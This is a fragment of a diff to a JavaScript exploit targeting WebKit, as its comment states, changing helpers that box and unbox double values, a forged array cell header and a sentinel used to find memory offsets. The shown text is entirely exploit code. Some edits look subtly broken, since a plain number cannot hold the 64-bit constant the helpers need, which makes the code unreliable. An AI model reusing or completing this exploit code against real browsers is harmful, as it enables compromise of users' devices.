@@ -336,12 +336,12 @@ function iv(x){
 // That's all the arithmetic we need for exploiting WebKit.. :)
 
           // constant added to double JSValues
-          const kBoxedDoubleOffset = new Int64("0x0002000000000000");
+          const kBoxedDoubleOffset = 0x0002000000000000;
           function boxDouble(d) {
-            return Add(new Int64(d),kBoxedDoubleOffset);
+            return Add(d,kBoxedDoubleOffset);
           }
           function unboxDouble(d) {
-            return Sub(new Int64(d),kBoxedDoubleOffset);
+            return Sub(d,kBoxedDoubleOffset);
           }
           // the structure ID is wrong, but we'll fix it :)
           let doubleArrayCellHeader = new Int64("0x0108230700000000").asJSValue();
@@ -389,7 +389,7 @@ function iv(x){
               return;
             }
 
-            const kSentinel = 1333.337;
+            const kSentinel = 13.37;
             let offset = -1;
 
             b1[0] = kSentinel;
